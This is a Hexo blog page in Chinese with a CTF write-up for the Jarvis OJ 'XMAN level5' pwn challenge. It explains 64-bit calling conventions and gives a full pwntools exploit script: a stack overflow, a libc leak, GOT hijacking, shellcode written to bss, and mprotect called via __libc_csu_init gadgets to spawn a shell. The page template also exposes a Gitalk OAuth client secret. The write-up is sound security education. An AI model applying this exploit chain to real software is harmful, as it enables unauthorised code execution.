@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>XMAN level5 | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="CTF,Pwn">
+    <meta name="description" content="题目信息 mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。 nc pwn2.jarvisoj.com 9884 附件同level3_x64  那么基础信息直接使用之前的 64位elf，只开了NX，并且给出了libc文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XMAN level5">
+<meta property="og:url" content="https://darkwing.moe/2019/05/21/XMAN-level5/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="题目信息 mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。 nc pwn2.jarvisoj.com 9884 附件同level3_x64  那么基础信息直接使用之前的 64位elf，只开了NX，并且给出了libc文件">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051709.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051710.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051711.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051712.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051713.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052008.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052009.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052010.jpg">
+<meta property="article:published_time" content="2019-05-21T01:48:47.000Z">
+<meta property="article:modified_time" content="2019-05-21T01:49:22.480Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051709.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                网恋选我我超甜
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">XMAN level5</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">XMAN level5</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-05-21T01:48:47.000Z" itemprop="datePublished" class="page-time">
+  2019-05-21
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#题目信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">题目信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#静态分析"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">静态分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#在32位程序运行中，函数参数直接压入栈中"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">在32位程序运行中，函数参数直接压入栈中</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#在64位程序运行中，参数传递需要寄存器"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">在64位程序运行中，参数传递需要寄存器</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#exploit"><span class="post-toc-number">2.</span> <span class="post-toc-text">exploit</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#构造exp"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">构造exp</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#getflag"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">getflag</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-XMAN-level5"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">XMAN level5</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-05-21 09:48:47" datetime="2019-05-21T01:48:47.000Z"  itemprop="datePublished">2019-05-21</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><blockquote>
+<p>mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。</p>
+<p><strong>nc pwn2.jarvisoj.com 9884</strong></p>
+<p>附件同level3_x64</p>
+</blockquote>
+<p>那么基础信息直接使用之前的</p>
+<p>64位elf，只开了NX，并且给出了libc文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051709.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>IDA F5，首先看elf文件，和level3一样，明显的溢出，但程序中没有直接的system和”/bin/sh”</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051710.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051711.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051712.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>给出的libc文件中有这两个</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051713.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p><del>那么思路就和level3类似，leak之后计算地址，执行system</del></p>
+<p>题目要求使用mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。</p>
+<p>区别同样只在于32位和64位的栈上</p>
+<h2 id="在32位程序运行中，函数参数直接压入栈中"><a href="#在32位程序运行中，函数参数直接压入栈中" class="headerlink" title="在32位程序运行中，函数参数直接压入栈中"></a>在32位程序运行中，函数参数直接压入栈中</h2><ul>
+<li>调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1</li>
+</ul>
+<h2 id="在64位程序运行中，参数传递需要寄存器"><a href="#在64位程序运行中，参数传递需要寄存器" class="headerlink" title="在64位程序运行中，参数传递需要寄存器"></a>在64位程序运行中，参数传递需要寄存器</h2><ul>
+<li>64位参数传递约定：前六个参数按顺序存储在寄存器rdi, rsi, rdx, rcx, r8, r9中</li>
+<li>参数超过六个时，从第七个开始压入栈中</li>
+</ul>
+<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><ol>
+<li>想要使用mprotect，且给了libc，那首选是用write函数leak出某个函数（比如write）的地址，然后由libc计算偏移得到mprotect。</li>
+<li>把shellcode写到bss段用read可以直接搞定不多说。</li>
+<li>由于是64位的程序，函数的前6个参数都是通过寄存器来传递的，而rwx的十进制表示是7（b111），且mprotect的函数定义是<code>int mprotect(void *addr, size_t len, int prot);</code>。我们的7是作为第三个参数放在rdx里，而一般是不存在有关rdx的gadgets的，所以这里我们考虑使用<code>__libc_csu_init</code>尾部的万能gadgets（能解决三个参数内的函数调用）。</li>
+<li>大致流程：栈溢出 -&gt; leak write -&gt; hijack got -&gt; read shellcode from stdin to bss -&gt; call mprotect to set ‘rwx’ -&gt; exec shellcode</li>
+</ol>
+<ul>
+<li>_libc_csu_init函数是程序调用libc库用来对程序进行初始化的函数，一般先于main函数执行</li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052008.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052009.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9884</span>)</span><br><span class="line"><span class="comment"># sh = process('./level5')</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">vuln_func = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line">write_libc = libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">pop_rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004006b1</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'A'</span> * <span class="number">0x88</span></span><br><span class="line">payload1 += p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(write_plt)</span><br><span class="line"><span class="comment"># hijack __libc_start_main -&gt; mprotect</span></span><br><span class="line">mprotect_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">payload1 += p64(pop_rsi_r15) + p64(mprotect_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(read_plt)</span><br><span class="line"><span class="comment"># read shellcode from stdin to bss</span></span><br><span class="line">payload1 += p64(pop_rsi_r15) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(read_plt)</span><br><span class="line"><span class="comment"># hijack __gmon_start__ -&gt; bss_shellcode</span></span><br><span class="line">bss_got = elf.got[<span class="string">'__gmon_start__'</span>]</span><br><span class="line">payload1 += p64(pop_rsi_r15) + p64(bss_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(read_plt)</span><br><span class="line">payload1 += p64(elf.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">sh.recv()  <span class="comment"># 'Input:\n'</span></span><br><span class="line">sh.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = write_addr - write_libc</span><br><span class="line">libc_mprotect = libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">mprotect_addr = libc_base + libc_mprotect</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sh.send(p64(mprotect_addr))</span><br><span class="line">pause()</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">pause()</span><br><span class="line">sh.send(p64(bss_addr))</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x400690 &lt;__libc_csu_init+64&gt;:	mov    rdx,r13</span></span><br><span class="line"><span class="string">0x400693 &lt;__libc_csu_init+67&gt;:	mov    rsi,r14</span></span><br><span class="line"><span class="string">0x400696 &lt;__libc_csu_init+70&gt;:	mov    edi,r15d</span></span><br><span class="line"><span class="string">0x400699 &lt;__libc_csu_init+73&gt;:	call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4006a6 &lt;__libc_csu_init+86&gt;:	add    rsp,0x8</span></span><br><span class="line"><span class="string">0x4006aa &lt;__libc_csu_init+90&gt;:	pop    rbx</span></span><br><span class="line"><span class="string">0x4006ab &lt;__libc_csu_init+91&gt;:	pop    rbp</span></span><br><span class="line"><span class="string">0x4006ac &lt;__libc_csu_init+92&gt;:	pop    r12</span></span><br><span class="line"><span class="string">0x4006ae &lt;__libc_csu_init+94&gt;:	pop    r13</span></span><br><span class="line"><span class="string">0x4006b0 &lt;__libc_csu_init+96&gt;:	pop    r14</span></span><br><span class="line"><span class="string">0x4006b2 &lt;__libc_csu_init+98&gt;:	pop    r15</span></span><br><span class="line"><span class="string">0x4006b4 &lt;__libc_csu_init+100&gt;:	ret</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'A'</span> * <span class="number">0x88</span></span><br><span class="line">payload2 += p64(<span class="number">0x4006a6</span>)</span><br><span class="line">payload2 += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload2 += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">payload2 += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line"><span class="comment"># r12-&gt;addr &gt;&gt; call mprotect to set 0x600000(rw-p) to rwxp so shellcode can be execute</span></span><br><span class="line">payload2 += p64(elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">payload2 += p64(<span class="number">7</span>)  <span class="comment"># r13 = rdx</span></span><br><span class="line">payload2 += p64(<span class="number">0x1000</span>)  <span class="comment"># r14 = rsi</span></span><br><span class="line">payload2 += p64(<span class="number">0x00600000</span>)  <span class="comment"># edi bss:0000000000600a88</span></span><br><span class="line">payload2 += p64(<span class="number">0x400690</span>)</span><br><span class="line">payload2 += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload2 += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">payload2 += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">payload2 += p64(elf.got[<span class="string">'__gmon_start__'</span>])  <span class="comment"># r12-&gt;addr &gt;&gt; call shellcode</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)  <span class="comment"># r13-&gt;rdx</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)  <span class="comment"># r14-&gt;rsi</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)  <span class="comment"># r15-&gt;edi</span></span><br><span class="line">payload2 += p64(<span class="number">0x400690</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()  <span class="comment"># 'Input:\n'</span></span><br><span class="line">pause()</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>因为是<code>call   QWORD PTR [r12+rbx*8]</code>，调用的指针，所以需要劫持GOT，不能直接使用地址</li>
+</ul>
+<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019052010.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2019-05-21T01:49:22.480Z" itemprop="dateUpdated">2019-05-21 09:49:22</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/05/21/XMAN-level5/&title=《XMAN level5》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/05/21/XMAN-level5/&title=《XMAN level5》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/05/21/XMAN-level5/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《XMAN level5》 — 喵喵喵喵&url=https://darkwing.moe/2019/05/21/XMAN-level5/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/05/21/XMAN-level5/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/05/23/61dctf-fm/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">61dctf fm</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/05/20/XMAN-level4/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">XMAN level4</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/05/21/XMAN-level5/&title=《XMAN level5》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/05/21/XMAN-level5/&title=《XMAN level5》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/05/21/XMAN-level5/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《XMAN level5》 — 喵喵喵喵&url=https://darkwing.moe/2019/05/21/XMAN-level5/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/05/21/XMAN-level5/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
